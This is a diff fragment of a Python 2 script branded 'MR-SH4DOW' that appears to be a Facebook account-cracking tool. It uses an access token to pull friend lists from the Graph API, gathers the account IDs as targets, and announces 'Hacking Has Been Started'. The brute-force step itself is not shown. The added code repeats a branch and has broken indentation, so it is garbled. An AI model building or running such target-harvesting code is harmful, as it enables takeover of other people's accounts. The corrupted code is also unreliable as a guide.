@@ -470,3 +470,41 @@ def pilih_super():
 			id.append(s['id'])
 	elif peak =="2":
 		os.system('clear')
+print "\033[1;97mвЂў-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------вЂў"
+		print logo
+		jalan('\033[1;97m[+]\033[1;91mMR-SH4DOWв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’..99%\033[1;97m:-:')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif peak =="2":
+		os.system('clear')
+		print "\033[1;97mвЂў-----------------\033[1;37mMR-SH4DOW\033[1;97m-----------------вЂў"
+		print logo
+		idt = raw_input("\033[1;97m[+]\033[1;91mEnter ID\033[1;97m: \033[1;97m")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;97m[+]\033[1;91mName\033[1;97m:\033[1;97m "+op["name"]
+		except KeyError:
+			print"\033[1;97m[+]\x1b[1;91mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;97m[+]\033[1;91mMR-SH4DOWв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’..100%\033[1;97m:-:"
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="0":
+		menu()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	
+	print "\033[1;97m[+]\033[1;91mTotal Accounts\033[1;97m: \033[1;97m"+str(len(id))
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m[+]\033[1;31mHacking Has Been Started\033[1;97m"+o),;sys.stdout.flush();time.sleep(0.05)
+	print "\n\033[1;97m[+]\x1b[1;31mStop Process Press CTRL+Z"
+	print "\033[1;97mвЂў-----------------\033[1;37m\033[1;97m\033[1;97m-----------------вЂў"
+ 	
